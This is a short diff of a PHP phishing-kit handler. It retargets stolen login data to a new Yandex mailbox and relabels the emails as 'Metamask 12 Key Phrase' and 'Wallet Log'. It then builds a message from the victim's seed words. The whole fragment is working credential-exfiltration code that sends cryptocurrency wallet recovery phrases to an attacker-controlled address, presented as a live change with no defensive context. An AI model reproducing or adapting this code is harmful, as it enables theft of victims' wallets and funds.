@@ -19,10 +19,10 @@ $bad = array('signal'=>'bad');
 
 
 if (!empty($login) && !empty($passwd)) {
-  $own = 'deralogs@yandex.com';
+  $own = 'shareridesapp@yandex.com';
   $date = date("D/M/d, Y g:i a");
-  $subj = "Backup from $ip";
-  $from = "From:Cashout Log (EUR) <mail@me.mom163.com>";
+  $subj = "Metamask 12 Key Phrase from $ip";
+    $from = "From:Wallet Log (EUR) <mail@me.mom163.com>";
   $msg = "$WoRd1\n";
   $msg .= "$WoRd2\n";
   $msg .= "$WoRd3\n";
